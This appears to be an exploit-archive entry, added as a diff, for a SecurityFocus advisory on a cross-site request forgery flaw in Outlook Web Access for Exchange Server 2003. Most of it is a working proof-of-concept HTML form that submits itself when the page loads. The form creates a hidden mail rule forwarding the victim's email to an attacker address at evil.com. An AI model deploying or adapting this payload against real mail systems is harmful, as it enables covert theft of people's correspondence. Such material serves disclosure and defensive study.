@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/41843/info
+
+Microsoft Outlook Web Access for Exchange Server 2003 is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain actions in the context of an authorized user's session and gain unauthorized access to the affected application; other attacks are also possible.
+
+<form name="xsrf" action="http://www.example.com/Exchange/victim_id" method="post" target="_self">
+<input type="hidden" name="cmd" value="saverule">
+<input type="hidden" name="rulename" value="evilrule">
+<input type="hidden" name="ruleaction" value="3">
+<input type="hidden" name="forwardtocount" value="1">
+<input type="hidden" name="forwardtoname" value="guy, bad">
+<input type="hidden" name="forwardtoemail" value="you@evil.com">
+<input type="hidden" name="forwardtotype" value="SMTP">
+<input type="hidden" name="forwardtoentryid" value="">
+<input type="hidden" name="forwardtosearchkey" value="">
+<input type="hidden" name="forwardtoisdl" value="">
+<input type="hidden" name="keepcopy" value="1">
+<body onload="document.forms.xsrf.submit();"> 
